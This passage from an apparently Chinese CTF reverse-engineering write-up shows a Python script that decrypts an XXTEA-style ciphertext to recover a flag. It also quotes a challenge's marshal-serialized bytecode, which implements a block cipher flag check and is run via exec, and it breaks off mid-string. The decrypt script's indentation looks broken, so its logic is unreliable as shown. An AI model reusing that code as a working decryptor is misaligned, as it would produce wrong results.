f.write(hex_bytes)</span><br></pre></td></tr></table></figure></div><p>生成的dll文件放进ida查看伪代码，生成的全是字符，使用findcrypto插件发现是TEA加密算法，编写的exp</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import binascii</span></span><br><span class="line"><span class="comment"># opcode =&quotquot;</span></span><br><span class="line"><span class="comment"># hex_bytes = binascii.a2b_hex(opcode)</span></span><br><span class="line"><span class="comment"># with open(&quot;enc.dll&quot;,&#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(hex_bytes)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    total = c_uint32(-rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">        v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">        y.value = v[p]</span><br><span class="line">    z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">    v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">    y.value = v[<span class="number">0</span>]</span><br><span class="line">    total.value += delta</span><br><span class="line">    rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ct =<span class="string">&quot;7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">    ct = binascii.a2b_hex(ct)</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">key = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">v = struct.unpack(<span class="string">&#x27;&lt;10I&#x27;</span>, ct)</span><br><span class="line">k = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key.encode() + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">v = <span class="built_in">list</span>(v)</span><br><span class="line">k = <span class="built_in">list</span>(k)</span><br><span class="line">n = <span class="number">10</span></span><br><span class="line">res = decrypt(n, v, k)</span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(r.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a><strong><strong>marshal</strong></strong></h2><p>原题python脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="comment"># import pickle</span></span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line"><span class="built_in">exec</span>(l)</span><br></pre></td></tr></table></figure></div><hr><blockquote><p>之前没接触过，猜测是运行结果啥的都在<code>exec</code>函数里面，使用的<code>dis.dis</code>不太像，后来又使用了umcompyle6，写出来的脚本跑出来啥也不是。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##原来的exp脚本</span></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> uncompyle6</span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x